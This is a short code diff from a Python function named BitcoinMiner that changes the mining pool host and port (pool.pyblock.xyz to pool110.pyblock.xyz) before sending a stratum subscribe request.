@@ -80,7 +80,7 @@ def BitcoinMiner(restart=False):
         print('[*] Bitcoin Miner Started')
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(('pool.pyblock.xyz', 4444))
+    sock.connect(('pool110.pyblock.xyz', 4445))
 
     sock.sendall(b'{"id": 1, "method": "mining.subscribe", "params": []}\n')
 
